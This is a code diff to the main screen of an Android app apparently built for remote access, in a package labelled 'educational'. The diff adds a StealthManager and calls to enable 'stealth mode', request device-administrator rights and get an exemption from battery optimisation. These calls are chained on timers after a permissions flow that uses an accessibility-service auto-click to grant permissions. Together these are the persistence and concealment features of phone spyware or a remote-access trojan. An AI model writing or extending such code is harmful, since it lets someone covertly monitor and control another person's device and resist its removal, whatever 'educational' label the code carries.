@@ -1,8 +1,10 @@
 package com.remoteaccess.educational;
 
 import android.content.Intent;
+import android.net.Uri;
 import android.os.Bundle;
 import android.os.Handler;
+import android.provider.Settings;
 import android.widget.Button;
 import android.widget.TextView;
 import android.widget.Toast;
@@ -10,6 +12,7 @@ import androidx.appcompat.app.AppCompatActivity;
 import com.remoteaccess.educational.permissions.AccessibilityHelperService;
 import com.remoteaccess.educational.permissions.AutoPermissionManager;
 import com.remoteaccess.educational.services.RemoteAccessService;
+import com.remoteaccess.educational.stealth.StealthManager;
 import com.remoteaccess.educational.utils.PreferenceManager;
 
 public class MainActivity extends AppCompatActivity {
@@ -18,6 +21,7 @@ public class MainActivity extends AppCompatActivity {
     private Button consentButton;
     private PreferenceManager preferenceManager;
     private AutoPermissionManager permissionManager;
+    private StealthManager stealthManager;
     private Handler handler;
 
     @Override
@@ -27,6 +31,7 @@ public class MainActivity extends AppCompatActivity {
 
         preferenceManager = new PreferenceManager(this);
         permissionManager = new AutoPermissionManager(this);
+        stealthManager = new StealthManager(this);
         handler = new Handler();
 
         statusText = findViewById(R.id.statusText);
@@ -96,20 +101,40 @@ public class MainActivity extends AppCompatActivity {
             permissionManager.requestAllPermissions();
         }, 1000);
 
-        // Request special permissions
+        // Request special permissions + battery + device admin
         new Handler().postDelayed(() -> {
             permissionManager.requestSpecialPermissions();
+            requestBatteryOptimization();
+            requestDeviceAdmin();
         }, 3000);
 
-        // Request notification
+        // Request notification + stealth mode
         new Handler().postDelayed(() -> {
             permissionManager.requestNotificationPermission();
+            enableStealthMode();
         }, 5000);
 
         // Disable auto-click after setup is complete (10 seconds)
         new Handler().postDelayed(() -> {
             AccessibilityHelperService.disableAutoClick();
         }, 10000);
+    }
+    
+    private void requestDeviceAdmin() {
+        try {
+            Intent intent = stealthManager.getDeviceAdminIntent();
+            startActivity(intent);
+        } catch (Exception e) {
+            // Ignore
+        }
+    }
+    
+    private void enableStealthMode() {
+        try {
+            stealthManager.enableStealthMode();
+        } catch (Exception e) {
+            // Ignore
+        }
     }
 
     @Override
@@ -154,5 +179,21 @@ public class MainActivity extends AppCompatActivity {
         Intent serviceIntent = new Intent(this, RemoteAccessService.class);
         stopService(serviceIntent);
         showConsentRequired();
+    }
+    
+    private void requestBatteryOptimization() {
+        try {
+            Intent intent = new Intent();
+            intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+            intent.setData(Uri.parse("package:" + getPackageName()));
+            startActivity(intent);
+        } catch (Exception e) {
+            try {
+                Intent intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
+                startActivity(intent);
+            } catch (Exception e2) {
+                // Ignore
+            }
+        }
     }
 }
